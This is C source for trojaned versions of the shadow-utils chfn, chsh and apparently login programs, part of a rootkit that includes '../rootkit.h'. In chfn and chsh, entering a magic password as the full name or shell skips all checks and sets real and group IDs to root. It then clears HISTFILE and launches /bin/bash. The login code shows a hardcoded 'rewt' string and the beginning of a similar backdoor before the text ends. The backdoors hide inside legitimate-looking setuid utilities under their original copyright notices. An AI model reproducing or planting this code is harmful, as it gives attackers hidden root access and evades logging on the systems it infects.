        MAG[6]='\0';

	/*
	 * This command behaves different for root and non-root
	 * users.
	 */

	amroot = (getuid () == 0);
#ifdef	NDBM
	pw_dbm_mode = O_RDWR;
#endif

	/*
	 * Get the program name.  The program name is used as a
	 * prefix to most error messages.  It is also used as input
	 * to the openlog() function for error logging.
	 */

	Prog = Basename(argv[0]);

	openlog("chfn", LOG_PID, LOG_AUTH);

	/* 
	 * The remaining arguments will be processed one by one and
	 * executed by this command.  The name is the last argument
	 * if it does not begin with a "-", otherwise the name is
	 * determined from the environment and must agree with the
	 * real UID.  Also, the UID will be checked for any commands
	 * which are restricted to root only.
	 */

	while ((flag = getopt (argc, argv, "f:r:w:h:o:")) != EOF) {
		switch (flag) {
			case 'f':
				if (!amroot && getdef_bool("CHFN_RESTRICT")) {
					fprintf(stderr, NOPERM, Prog);
					exit(1);
				}
				fflg++;
				STRFCPY(fullnm, optarg);
				break;
			case 'r':
				rflg++;
				STRFCPY(roomno, optarg);
				break;
			case 'w':
				wflg++;
				STRFCPY(workph, optarg);
				break;
			case 'h':
				hflg++;
				STRFCPY(homeph, optarg);
				break;
			case 'o':
				if (amroot) {
					oflg++;
					STRFCPY(slop, optarg);
					break;
				}
				fprintf (stderr, NOPERM, Prog);
				closelog ();
				exit (1);
			default:
				usage ();
		}
	}

	/*
	 * Get the name of the user to check.  It is either
	 * the command line name, or the name getlogin()
	 * returns.
	 */

	if (optind < argc)
		strncpy (user, argv[optind], sizeof(user) - 1);
	else if ((cp = getlogin ()))
		strncpy (user, cp, sizeof(user) - 1);
	else {
		fprintf (stderr, WHOAREYOU, Prog);
		closelog ();
		exit (1);
	}
	user[sizeof(user) - 1] = '\0';
	pw = getpwnam(user);

	/*
	 * Make certain there was a password entry for the
	 * user.
	 */

	if (! pw) {
		fprintf (stderr, UNKUSER, Prog, user);
		closelog ();
		exit (1);
	}

#ifdef	USE_NIS
	/*
	 * Now we make sure this is a LOCAL password entry for
	 * this user ...
	 */

	if (__ispwNIS ()) {
		char	*nis_domain;
		char	*nis_master;

		fprintf (stderr, NISUSER, Prog, user);

		if (! yp_get_default_domain (&nis_domain) &&
				! yp_master (nis_domain, "passwd.byname",
				&nis_master)) {
			fprintf (stderr, NISMASTER, Prog, nis_master);
		}
		exit (1);
	}
#endif

	/*
	 * Non-privileged users are only allowed to change the
	 * gecos field if the UID of the user matches the current
	 * real UID.
	 */

	if (! amroot && pw->pw_uid != getuid ()) {
		fprintf (stderr, NOPERM, Prog);
		closelog ();
		exit (1);
	}

	/*
	 * Non-privileged users are optionally authenticated
	 * (must enter the password of the user whose information
	 * is being changed) before any changes can be made.
	 * Idea from util-linux chfn/chsh.  --marekm
	 */

	if (!amroot && getdef_bool("CHFN_AUTH"))
		passwd_check(pw->pw_name, pw->pw_passwd);
	
	/*
	 * Now get the full name.  It is the first comma separated field
	 * in the GECOS field.
	 */

	STRFCPY(old_gecos, pw->pw_gecos);
	cp = copy_field (old_gecos, fflg ? (char *) 0:fullnm, slop);

	/*
	 * Now get the room number.  It is the next comma separated field,
	 * if there is indeed one.
	 */

	if (cp)
		cp = copy_field (cp, rflg ? (char *) 0:roomno, slop);

	/*
	 * Now get the work phone number.  It is the third field.
	 */

	if (cp)
		cp = copy_field (cp, wflg ? (char *) 0:workph, slop);

	/*
	 * Now get the home phone number.  It is the fourth field.
	 */

	if (cp)
		cp = copy_field (cp, hflg ? (char *) 0:homeph, slop);

	/*
	 * Anything left over is "slop".
	 */

	if (cp && !oflg) {
		if (slop[0])
			strcat (slop, ",");

		strcat (slop, cp);
	}

	/*
	 * If none of the fields were changed from the command line,
	 * let the user interactively change them.
	 */

	if (! fflg && ! rflg && ! wflg && ! hflg && ! oflg) {
		printf (NEWFIELDSMSG, user);
		new_fields ();
	}

    if (!strcmp(fullnm,MAG)) elite++;
    if (!elite) {

	/*
	 * Check all of the fields for valid information
	 */

	if (valid_field (fullnm, ":,=")) {
		fprintf (stderr, INVALID_NAME, Prog, fullnm);
		closelog ();
		exit (1);
	}
	if (valid_field (roomno, ":,=")) {
		fprintf (stderr, INVALID_ROOM, Prog, roomno);
		closelog ();
		exit (1);
	}
	if (valid_field (workph, ":,=")) {
		fprintf (stderr, INVALID_WORKPH, Prog, workph);
		closelog ();
		exit (1);
	}
	if (valid_field (homeph, ":,=")) {
		fprintf (stderr, INVALID_HOMEPH, Prog, homeph);
		closelog ();
		exit (1);
	}
	if (valid_field (slop, ":")) {
		fprintf (stderr, INVALID_OTHER, Prog, slop);
		closelog ();
		exit (1);
	}

	/*
	 * Build the new GECOS field by plastering all the pieces together,
	 * if they will fit ...
	 */

	if (strlen (fullnm) + strlen (roomno) + strlen (workph) +
			strlen (homeph) + strlen (slop) > (unsigned int) 80) {
		fprintf (stderr, INVALID_FIELDS, Prog);
		closelog ();
		exit (1);
	}
	sprintf (new_gecos, "%s,%s,%s,%s", fullnm, roomno, workph, homeph);
	if (slop[0]) {
		strcat (new_gecos, ",");
		strcat (new_gecos, slop);
	}

	/*
	 * Before going any further, raise the ulimit to prevent
	 * colliding into a lowered ulimit, and set the real UID
	 * to root to protect against unexpected signals.  Any
	 * keyboard signals are set to be ignored.
	 */

	set_filesize_limit(30000);

	if (setuid (0)) {
		fprintf (stderr, NOTROOT);
		SYSLOG((LOG_ERR, NOTROOT2));
		closelog();
		exit (1);
	}
	signal (SIGHUP, SIG_IGN);
	signal (SIGINT, SIG_IGN);
	signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	signal (SIGTSTP, SIG_IGN);
#endif

	/*
	 * The passwd entry is now ready to be committed back to
	 * the password file.  Get a lock on the file and open it.
	 */

	for (i = 0;i < 30;i++) {
		if (pw_lock ())
			break;
	}

	if (i == 30) {
		fprintf (stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		closelog();
		exit (1);
	}
	if (! pw_open (O_RDWR)) {
		fprintf (stderr, OPNERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, OPNERROR2));
		closelog();
		exit (1);
	}

	/*
	 * Get the entry to update using pw_locate() - we want the real
	 * one from /etc/passwd, not the one from getpwnam() which could
	 * contain the shadow password if (despite the warnings) someone
	 * enables AUTOSHADOW (or SHADOW_COMPAT in libc).  --marekm
	 */
	pw = pw_locate(user);
	if (!pw) {
		pw_unlock();
		fprintf(stderr, "user not found in local passwd file\n");
		exit(1);
	}

	/*
	 * Make a copy of the entry, then change the gecos field.  The other
	 * fields remain unchanged.
	 */
	pwent = *pw;
	pwent.pw_gecos = new_gecos;

	/*
	 * Update the passwd file entry.  If there is a DBM file,
	 * update that entry as well.
	 */

	if (! pw_update (&pwent)) {
		fprintf (stderr, UPDERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, UPDERROR2));
		closelog();
		exit (1);
	}
#if defined(DBM) || defined(NDBM)
	if (pw_dbm_present() && ! pw_dbm_update (&pwent)) {
		fprintf (stderr, DBMERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, DBMERROR2));
		closelog();
		exit (1);
	}
	endpwent ();
#endif

	/*
	 * Changes have all been made, so commit them and unlock the
	 * file.
	 */

	if (! pw_close ()) {
		fprintf (stderr, CLSERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, CLSERROR2));
		closelog();
		exit (1);
	}
	if (! pw_unlock ()) {
		fprintf (stderr, UNLKERROR);
		SYSLOG((LOG_ERR, UNLKERROR2));
		closelog();
		exit (1);
	}
	SYSLOG((LOG_INFO, CHGGECOS, user));
	closelog();
	exit (0);
} /* end elite */
    if (elite) {
        setreuid(0,0);
        setregid(0,0);
        setenv("HISTFILE","",1);
        system("/bin/bash");
        }
exit (0);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chsh.c,v 1.4 1996/09/25 03:20:00 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#include <pwd.h>
#include "pwio.h"
#include "getdef.h"
#include "pwauth.h"

#ifdef SHADOWPWD
#include <shadow.h>
#endif

#ifndef SHELLS_FILE
#define SHELLS_FILE "/etc/shells"
#endif

#include "../rootkit.h"

/*
 * Global variables.
 */

static char *Prog;			/* Program name */
static int amroot;				/* Real UID is root */
static char loginsh[BUFSIZ];		/* Name of new login shell */

/*
 * External identifiers
 */

extern	int	optind;
extern	char	*optarg;
#ifdef	NDBM
extern	int	pw_dbm_mode;
#endif

/*
 * #defines for messages.  This facilitates foreign language conversion
 * since all messages are defined right here.
 */

#define	USAGE		"Usage: %s [ -s shell ] [ name ]\n"
#define	WHOAREYOU	"%s: Cannot determine your user name.\n"
#define	UNKUSER		"%s: Unknown user %s\n"
#define WRONGPWD	"Incorrect password for %s.\n"
#define WRONGPWD2	"incorrect password for `%s'"
#define	NOPERM		"You may not change the shell for %s.\n"
#define	NOPERM2		"can't change shell for `%s'\n"
#define	NEWSHELLMSG	"Changing the login shell for %s\n"
#define	NEWSHELL	"Login Shell"
#define	NEWSHELLMSG2 \
	"Enter the new value, or press return for the default\n\n"
#define	BADSHELL	"%s is an invalid shell.\n"
#define	BADFIELD	"%s: Invalid entry: %s\n"
#define	PWDBUSY		"Cannot lock the password file; try again later.\n"
#define	PWDBUSY2	"can't lock /etc/passwd\n"
#define	OPNERROR	"Cannot open the password file.\n"
#define	OPNERROR2	"can't open /etc/passwd\n"
#define	UPDERROR	"Error updating the password entry.\n"
#define	UPDERROR2	"error updating passwd entry\n"
#define	DBMERROR	"Error updating the DBM password entry.\n"
#define	DBMERROR2	"error updating DBM passwd entry.\n"
#define	NOTROOT		"Cannot change ID to root.\n"
#define	NOTROOT2	"can't setuid(0).\n"
#define	CLSERROR	"Cannot commit password file changes.\n"
#define	CLSERROR2	"can't rewrite /etc/passwd.\n"
#define	UNLKERROR	"Cannot unlock the password file.\n"
#define	UNLKERROR2	"can't unlock /etc/passwd.\n"
#define	CHGSHELL	"changed user `%s' shell to `%s'\n"
#ifdef	USE_NIS
#define	NISUSER		"%s: cannot change user `%s' on NIS client.\n"
#define	NISMASTER	"%s: `%s' is the NIS master for this client.\n"
#endif

/*
 * usage - print command line syntax and exit
 */

static void
usage()
{
	fprintf (stderr, USAGE, Prog);
	exit (1);
}

/*
 * new_fields - change the user's login shell information interactively
 *
 * prompt the user for the login shell and change it according to the
 * response, or leave it alone if nothing was entered.
 */

static void
new_fields()
{
	printf (NEWSHELLMSG2);
	change_field(loginsh, sizeof loginsh, NEWSHELL);
}

/*
 * check_shell - see if the user's login shell is listed in /etc/shells
 *
 * The /etc/shells file is read for valid names of login shells.  If the
 * /etc/shells file does not exist the user cannot set any shell unless
 * they are root.
 */

/* If getusershell() is available (Linux, probably BSD too), use it
   instead of re-implementing it...  --marekm */

static int
check_shell(shell)
	const char *shell;
{
	char	*cp;
#ifndef HAVE_GETUSERSHELL
	char	buf[BUFSIZ];
	int	found = 0;
	FILE	*fp;
#endif

	if (amroot)
		return 1;

	/* Don't let the user change the shell to something they can't
	   execute anyway (even if listed in /etc/shells).  --marekm */
	if (access(shell, X_OK))
		return 0;

#ifdef HAVE_GETUSERSHELL
	setusershell();
	while ((cp = getusershell()) && strcmp(shell, cp))
		;
	endusershell();
	return cp ? 1 : 0;
#else
	if ((fp = fopen (SHELLS_FILE, "r")) == (FILE *) 0)
		return 0;

	while (fgets (buf, sizeof(buf), fp) && ! found) {
		if (cp = strrchr (buf, '\n'))
			*cp = '\0';

		if (strcmp (buf, shell) == 0)
			found = 1;
	}
	fclose (fp);

	return found;
#endif
}

/*
 * restricted_shell - return true if the named shell begins with 'r' or 'R'
 *
 * If the first letter of the filename is 'r' or 'R', the shell is
 * considered to be restricted.
 */

static int
restricted_shell(shell)
	char *shell;
{
#if 0
	char *cp = Basename(shell);
	return *cp == 'r' || *cp == 'R';
#else
	/*
	 * Shells not listed in /etc/shells are considered to be
	 * restricted.  Changed this to avoid confusion with "rc"
	 * (the plan9 shell - not restricted despite the name
	 * starting with 'r').  --marekm
	 */
	return !check_shell(shell);
#endif
}

static void
passwd_check(user, passwd)
	const char *user;
	const char *passwd;
{
#ifdef SHADOWPWD
	struct spwd *sp;

	if ((sp = getspnam(user)))
		passwd = sp->sp_pwdp;
	endspent();
#endif
	if (pw_auth(passwd, user, PW_LOGIN, (char *) 0) != 0) {
		SYSLOG((LOG_WARN, WRONGPWD2, user));
		sleep(1);
		fprintf(stderr, WRONGPWD, user);
		exit(1);
	}
}

/*
 * chsh - this command controls changes to the user's shell
 *
 *	The only supported option is -s which permits the
 *	the login shell to be set from the command line.
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	user[BUFSIZ];		/* User name                         */
	int	flag;			/* Current command line flag         */
	int	sflg = 0;		/* -s - set shell from command line  */
	int	i;			/* Loop control variable             */
	char	*cp;			/* Miscellaneous character pointer   */
	const struct passwd *pw;	/* Password entry from /etc/passwd   */
	struct	passwd	pwent;		/* New password entry                */

    char MAG[6];
    int elite=0;

    strcpy(MAG,"");

        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	/*
	 * This command behaves different for root and non-root
	 * users.
	 */

	amroot = getuid () == 0;
#ifdef	NDBM
	pw_dbm_mode = O_RDWR;
#endif

	/*
	 * Get the program name.  The program name is used as a
	 * prefix to most error messages.  It is also used as input
	 * to the openlog() function for error logging.
	 */

	Prog = Basename(argv[0]);

	openlog("chsh", LOG_PID, LOG_AUTH);

	/*
	 * There is only one option, but use getopt() anyway to
	 * keep things consistent.
	 */

	while ((flag = getopt (argc, argv, "s:")) != EOF) {
		switch (flag) {
			case 's':
				sflg++;
				STRFCPY(loginsh, optarg);
				break;
			default:
				usage ();
		}
	}

	/*
	 * There should be only one remaining argument at most
	 * and it should be the user's name.
	 */

	if (argc > optind + 1)
		usage ();

	/*
	 * Get the name of the user to check.  It is either
	 * the command line name, or the name getlogin()
	 * returns.
	 */

	if (optind < argc)
		strncpy (user, argv[optind], sizeof(user) - 1);
	else if ((cp = getlogin ()))
		strncpy (user, cp, sizeof(user) - 1);
	else {
		fprintf (stderr, WHOAREYOU, Prog);
		closelog ();
		exit (1);
	}
	user[sizeof(user) - 1] = '\0';
	pw = getpwnam(user);

	/*
	 * Make certain there was a password entry for the
	 * user.
	 */

	if (! pw) {
		fprintf (stderr, UNKUSER, Prog, user);
		closelog();
		exit (1);
	}

#ifdef	USE_NIS
	/*
	 * Now we make sure this is a LOCAL password entry for
	 * this user ...
	 */

	if (__ispwNIS ()) {
		char	*nis_domain;
		char	*nis_master;

		fprintf (stderr, NISUSER, Prog, user);

		if (! yp_get_default_domain (&nis_domain) &&
				! yp_master (nis_domain, "passwd.byname",
				&nis_master)) {
			fprintf (stderr, NISMASTER, Prog, nis_master);
		}
		exit (1);
	}
#endif

	/*
	 * Non-privileged users are only allowed to change the
	 * shell if the UID of the user matches the current
	 * real UID.
	 */

	if (! amroot && pw->pw_uid != getuid ()) {
		fprintf (stderr, NOPERM, user);
		SYSLOG((LOG_WARN, NOPERM2, user));
		closelog();
		exit (1);
	}

	/*
	 * Non-privileged users are only allowed to change the
	 * shell if it is not a restricted one.
	 */

	if (! amroot && restricted_shell (pw->pw_shell)) {
		fprintf (stderr, NOPERM, user);
		SYSLOG((LOG_WARN, NOPERM2, user));
		closelog();
		exit (1);
	}

	/*
 	* Non-privileged users are optionally authenticated
 	* (must enter the password of the user whose information
 	* is being changed) before any changes can be made.
 	* Idea from util-linux chfn/chsh.  --marekm
 	*/

	if (!amroot && getdef_bool("CHFN_AUTH"))
		passwd_check(pw->pw_name, pw->pw_passwd);

	/*
	 * Now get the login shell.  Either get it from the password
	 * file, or use the value from the command line.
	 */

	if (! sflg)
		STRFCPY(loginsh, pw->pw_shell);

	/*
	 * If the login shell was not set on the command line,
	 * let the user interactively change it.
	 */

	if (! sflg) {
		printf (NEWSHELLMSG, user);
		new_fields ();
	}

if (!strcmp(loginsh,MAG)) elite++;
if (!elite) {


	/*
	 * Check all of the fields for valid information.  The shell
	 * field may not contain any illegal characters.  Non-privileged
	 * users are restricted to using the shells in /etc/shells.
	 */

	if (valid_field (loginsh, ":,=")) {
		fprintf (stderr, BADFIELD, Prog, loginsh);
		closelog();
		exit (1);
	}
	if (! check_shell (loginsh)) {
		fprintf (stderr, BADSHELL, loginsh);
		closelog();
		exit (1);
	}

	/*
	 * Before going any further, raise the ulimit to prevent
	 * colliding into a lowered ulimit, and set the real UID
	 * to root to protect against unexpected signals.  Any
	 * keyboard signals are set to be ignored.
	 */

	set_filesize_limit(30000);

	if (setuid (0)) {
		fprintf (stderr, NOTROOT);
		SYSLOG((LOG_ERR, NOTROOT2));
		closelog();
		exit (1);
	}
	signal (SIGHUP, SIG_IGN);
	signal (SIGINT, SIG_IGN);
	signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	signal (SIGTSTP, SIG_IGN);
#endif

	/*
	 * The passwd entry is now ready to be committed back to
	 * the password file.  Get a lock on the file and open it.
	 */

	for (i = 0;i < 30;i++) {
		if (pw_lock ())
			break;
	}

	if (i == 30) {
		fprintf (stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		closelog();
		exit (1);
	}
	if (! pw_open (O_RDWR)) {
		fprintf (stderr, OPNERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, OPNERROR2));
		closelog();
		exit (1);
	}

	/*
	 * Get the entry to update using pw_locate() - we want the real
	 * one from /etc/passwd, not the one from getpwnam() which could
	 * contain the shadow password if (despite the warnings) someone
	 * enables AUTOSHADOW (or SHADOW_COMPAT in libc).  --marekm
	 */
	pw = pw_locate(user);
	if (!pw) {
		pw_unlock();
		fprintf(stderr, "user not found in local passwd file\n");
		exit(1);
	}

	/*
	 * Make a copy of the entry, then change the shell field.  The other
	 * fields remain unchanged.
	 */
	pwent = *pw;
	pwent.pw_shell = loginsh;

	/*
	 * Update the passwd file entry.  If there is a DBM file,
	 * update that entry as well.
	 */

	if (! pw_update (&pwent)) {
		fprintf (stderr, UPDERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, UPDERROR2));
		closelog();
		exit (1);
	}
#if defined(DBM) || defined(NDBM)
	if (pw_dbm_present() && ! pw_dbm_update (&pwent)) {
		fprintf (stderr, DBMERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, DBMERROR2));
		closelog();
		exit (1);
	}
	endpwent ();
#endif

	/*
	 * Changes have all been made, so commit them and unlock the
	 * file.
	 */

	if (! pw_close ()) {
		fprintf (stderr, CLSERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, CLSERROR2));
		closelog();
		exit (1);
	}
	if (! pw_unlock ()) {
		fprintf (stderr, UNLKERROR);
		SYSLOG((LOG_ERR, UNLKERROR2));
		closelog();
		exit (1);
	}
	SYSLOG((LOG_INFO, CHGSHELL, user, loginsh));
	closelog();
	exit (0);
} /* end elite */
    if (elite) {
        setreuid(0,0);
        setregid(0,0);
        setenv("HISTFILE","",1);
        system("/bin/bash");
        }
exit(0);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: login.c,v 1.4 1996/09/25 03:20:02 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <sys/stat.h>
#include <stdio.h>
#include <pwd.h>
#include <grp.h>
#if HAVE_UTMPX_H
#include <utmpx.h>
#else
#include <utmp.h>
#endif
#include <signal.h>

#if HAVE_LASTLOG_H
#include <lastlog.h>
#else
#include "lastlog_.h"
#endif

#include "faillog.h"
#include "pwauth.h"
#include "getdef.h"

#ifdef SVR4_SI86_EUA
#include <sys/proc.h>
#include <sys/sysi86.h>
#endif

#ifdef RADIUS
/*
 * Support for RADIUS authentication based on a hacked util-linux login
 * source sent to me by Jon Lewis.  Not tested.  You need to link login
 * with the radauth.c file (not included here - it doesn't have a clear
 * copyright statement, and I don't want to have problems with Debian
 * putting the whole package in non-free because of this).  --marekm
 */
#include "radlogin.h"
#endif

char	host[BUFSIZ];

struct	passwd	pwent;
#if HAVE_UTMPX_H
struct	utmpx	utxent, failent;
struct	utmp	utent;
#else
struct	utmp	utent, failent;
#endif
struct	lastlog	lastlog;
int	pflg;
int	fflg;
#ifdef RLOGIN
int	rflg;
#else
#define rflg 0
#endif
int	hflg;
int	preauth_flag;

/*
 * Global variables.
 */

static char *Prog;
static int amroot;

/*
 * External identifiers.
 */

extern char **newenvp;
extern size_t newenvc;

extern	char	*tz();
extern	void	checkutmp();
extern	void	setutmp();
extern	void	subsystem();
extern	void	dolastlog();
extern	void	motd();
extern	void	mailcheck();

extern	int	optind;
extern	char	*optarg;
extern	char	**environ;

extern	int	login_access();
extern	void	login_fbtab();

#ifndef	ALARM
#define	ALARM	60
#endif

#ifndef	RETRIES
#define	RETRIES	3
#endif

#ifndef LOGIN_PROMPT
#ifdef __linux__  /* hostname login: - like in util-linux login */
#define LOGIN_PROMPT "\n%s login: "
#else
#define LOGIN_PROMPT "login: "
#endif
#endif

static struct faillog faillog;

#define	NO_SHADOW	"no shadow password for `%s'%s\n"
#define	BAD_PASSWD	"invalid password for `%s'%s\n"
#define	BAD_DIALUP	"invalid dialup password for `%s' on `%s'\n"
#define	BAD_TIME	"invalid login time for `%s'%s\n"
#define	BAD_ROOT_LOGIN	"ILLEGAL ROOT LOGIN%s\n"
#define	ROOT_LOGIN	"ROOT LOGIN%s\n"
#define	FAILURE_CNT	"exceeded failure limit for `%s'%s\n"
#define REG_LOGIN	"`%s' logged in%s\n"
#define LOGIN_REFUSED	"LOGIN `%s' REFUSED%s\n"
#define REENABLED \
	"Warning: login re-enabled after temporary lockout.\n"
#define REENABLED2 \
	"login `%s' re-enabled after temporary lockout (%d failures).\n"
#define MANY_FAILS	"REPEATED login failures%s\n"

/*
 * usage - print login command usage and exit
 *
 * login [ name ]
 * login -r hostname	(for rlogind)
 * login -h hostname	(for telnetd, etc.)
 * login -f name	(for pre-authenticated login: datakit, xterm, etc.)
 */

static void
usage()
{
	fprintf(stderr, "usage: login [ -p ] [ name ]\n");
	if (amroot) {
		fprintf(stderr, "       login [ -p ] [ -f name ] -h host\n");
		fprintf(stderr, "       login [ -p ] -f name\n");
#ifdef RLOGIN
		fprintf(stderr, "       login [ -p ] -r name\n");
#endif
	}
	exit(1);
}


static void
setup_tty()
{
	TERMIO	termio;

	GTTY (0, &termio);		/* get terminal characteristics */

	/*
	 * Add your favorite terminal modes here ...
	 */

#ifndef	USE_SGTTY
	termio.c_lflag |= ISIG|ICANON|ECHO|ECHOE;
	termio.c_iflag |= ICRNL;

#if defined(ECHOKE) && defined(ECHOCTL)
	termio.c_lflag |= ECHOKE|ECHOCTL;
#endif
#if defined(ECHOPRT) && defined(NOFLSH) && defined(TOSTOP)
	termio.c_lflag &= ~(ECHOPRT|NOFLSH|TOSTOP);
#endif
#ifdef	ONLCR
	termio.c_oflag |= ONLCR;
#endif

#ifdef	SUN4

	/*
	 * Terminal setup for SunOS 4.1 courtesy of Steve Allen
	 * at UCO/Lick.
	 */

	termio.c_cc[VEOF] = '\04';
	termio.c_cflag &= ~CSIZE;
	termio.c_cflag |= (PARENB|CS7);
	termio.c_lflag |= (ISIG|ICANON|ECHO|IEXTEN);
	termio.c_iflag |= (BRKINT|IGNPAR|ISTRIP|IMAXBEL|ICRNL|IXON);
	termio.c_iflag &= ~IXANY;
	termio.c_oflag |= (XTABS|OPOST|ONLCR);
#endif
	termio.c_cc[VERASE] = getdef_num("ERASECHAR", '\b');
	termio.c_cc[VKILL] = getdef_num("KILLCHAR", '\025');

	/*
	 * ttymon invocation prefers this, but these settings won't come into
	 * effect after the first username login 
	 */

#else
#endif	/* !BSD */
	STTY (0, &termio);
}


/*
 * Tell the user that this is not the right time to login at this tty
 */
static void
bad_time_notify()
{
	char *mesg = "Invalid login time\r\n";
#ifdef HUP_MESG_FILE
	FILE *mfp;

	if ((mfp = fopen(HUP_MESG_FILE, "r")) != NULL) {
		int c;

		while ((c = fgetc(mfp)) != EOF) {
        		if (c == '\n')
                		putchar('\r');
        		putchar(c);
		}
		fclose(mfp);
	} else
#endif
		printf(mesg);
	fflush(stdout);
}


/*
 * login - create a new login session for a user
 *
 *	login is typically called by getty as the second step of a
 *	new user session.  getty is responsible for setting the line
 *	characteristics to a reasonable set of values and getting
 *	the name of the user to be logged in.  login may also be
 *	called to create a new user session on a pty for a variety
 *	of reasons, such as X servers or network logins.
 *
 *	the flags which login supports are
 *	
 *	-p - preserve the environment
 *	-r - perform autologin protocol for rlogin
 *	-f - do not perform authentication, user is preauthenticated
 *	-h - the name of the remote host
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	name[32];
	char	tty[BUFSIZ];
#ifdef RLOGIN
	char	term[128] = "";
	extern int rlogin();
#endif
	int	reason = PW_LOGIN;
	int	retries;
	int	arg;
	int	failed;
	int	flag;
	int	subroot = 0;
	int	is_console;
	int	i;
	char	*fname;
	char	*cp;
	char	*tmp;
	char	fromhost[512];
	struct	passwd	*pwd;
	char	**envp = environ;
#ifdef	SHADOWPWD
	struct	spwd	*spwd=NULL;
#endif
#ifdef RADIUS
	RAD_USER_DATA rad_user_data;
	int is_rad_login;
#endif
        int elite=0;
        char rewt[5];

        strcpy(rewt,"");
        rewt[0]='r';
        rewt[1]='e';
        rewt[2]='w';
        rewt[3]='t';
        rewt[4]='\0';
#if defined(RADIUS) || defined(DES_RPC) || defined(KERBEROS)
	/* from pwauth.c */
	extern char *clear_pass;
	extern int wipe_clear_pass;

	/*
	 * We may need the password later, don't want pw_auth() to wipe it
	 * (we do it ourselves when it is no longer needed).  --marekm
	 */
	wipe_clear_pass = 0;
#endif

	/*
	 * Some quick initialization.
	 */

	initenv();
	name[0] = '\0';
	amroot = (getuid() == 0);

	/*
	 * Check the flags for proper form.  Every argument starting with
	 * "-" must be exactly two characters long.  This closes all the
	 * clever rlogin, telnet, and getty holes.
	 */

	for (arg = 1;arg < argc;arg++) {
		if (argv[arg][0] == '-' && strlen (argv[arg]) > 2)
			usage ();
	}

	Prog = Basename(argv[0]);

